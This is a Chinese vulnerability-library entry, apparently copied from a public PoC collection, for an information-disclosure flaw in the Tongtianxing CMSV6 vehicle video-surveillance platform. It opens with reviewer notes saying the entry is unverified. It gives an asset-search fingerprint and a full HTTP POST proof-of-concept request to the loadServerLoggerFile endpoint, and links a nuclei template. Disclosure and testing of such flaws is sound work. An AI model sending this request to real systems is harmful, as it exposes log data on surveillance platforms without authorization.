---
fofa: ""
source: "wy876 漏洞文库"
product: "通天星 CMSV6 车载视频监控平台"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
fofa_unverified: "web.body="
category_recommendation: "IOT安全/其他设备"
title: "通天星CMSV6车载视频监控平台SelectDevAction_loadServerLoggerFile存在信息泄露漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：loadServerLoggerFile;auth/versionsunknown;pagin doubleencoding"
side_effects: "未执行；本文需注意的操作影响：分类更正：CMSV6 在本文指车载定位/视频监控行业平台，不是通用内容管理系统。其设备、调度或记录接口的业务状态和权限需按本文具体路由判断，不能只按名称 CMS 归类。"
source_status: "unknown"
id: "vw-e60ed933ed651753a060f857"
entity_id: "ve-e60ed933ed651753a060f857"
schema_version: "1"
---

## 核对与使用边界

- 分类更正：CMSV6 在本文指车载定位/视频监控行业平台，不是通用内容管理系统。其设备、调度或记录接口的业务状态和权限需按本文具体路由判断，不能只按名称 CMS 归类。

- 测绘字段处置：原 fofa 字段为残缺表达式、错误平台语法或当前解析器不支持的形式，原值完整保留到 fofa_unverified，不把它当作已校验查询或受影响资产证据。正文检索方法保留；具体问题见下列原审阅项。

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：loadServerLoggerFile;auth/versionsunknown;pagin doubleencoding

- **凭据与会话边界（1）**：接口名称似日志列表，但没有响应/敏感字段，不能直接确认配置或凭据泄漏。抓包中的会话不能视为未认证访问证明。需重新取得授权测试会话，不能复用文中值。

- **凭据与会话边界（2）**：仅未带Cookie不足证明无鉴权，需正常/匿名对照。抓包中的会话不能视为未认证访问证明。需重新取得授权测试会话，不能复用文中值。

- **代码与转录边界（3）**：元fofa实际Hunter语法残缺，行业平台应移出CMS。相应原代码作为存在此问题的历史样本保留，不能直接当作可运行、成功复现的 PoC；缺失内容需回原稿核对，不据此补造可执行攻击链。

- **事实待核（4）**：外部nuclei仅链接未内容，不能当已验证检测；无修复版。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# 通天星CMSV6车载视频监控平台 SelectDevAction_loadServerLoggerFile存在信息泄露漏洞

# 一、漏洞简介
通天星CMSV6车载视频监控平台是东莞市通天星软件科技有限公司研发的监控平台，通天星CMSV6产品覆盖车载录像机、单兵录像机、网络监控摄像机、行驶记录仪等产品的视频综合平台。通天星科技应用于公交车车载、校车车载、大巴车车载、物流车载、油品运输车载、警车车载等公共交通视频监控，还应用在家居看护、商铺远程监控、私家车的行驶分享仪上等。通天星CMSV6车载视频监控平台SelectDevAction_loadServerLoggerFile存在信息泄露漏洞。

# 二、影响版本
+ 通天星CMSV6车载视频监控平台

# 三、资产测绘
+ hunter`web.body="./open/webApi.html"`
+ 特征


# 四、漏洞复现
```plain
POST /808gps/LoggerManagement/SelectDevAction_loadServerLoggerFile.action HTTP/1.1
Host: {hostname}
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh-HK;q=0.9,zh;q=0.8
Connection: close

page=1&rp=15&query=&qtype=&pagin=%257B%2522currentPage%2522%253A1%252C%2522pageRecords%2522%253A15%257D
```


nuclei脚本

[通天星-CMSV6-selectdevaction-loadserverloggerfile-信息泄露.yaml](https://www.yuque.com/attachments/yuque/0/2024/yaml/29512878/1735362335744-7f4aa846-6ab1-4fda-99a8-38cd92d8f800.yaml)


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/uok15t8ka9xabpil>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
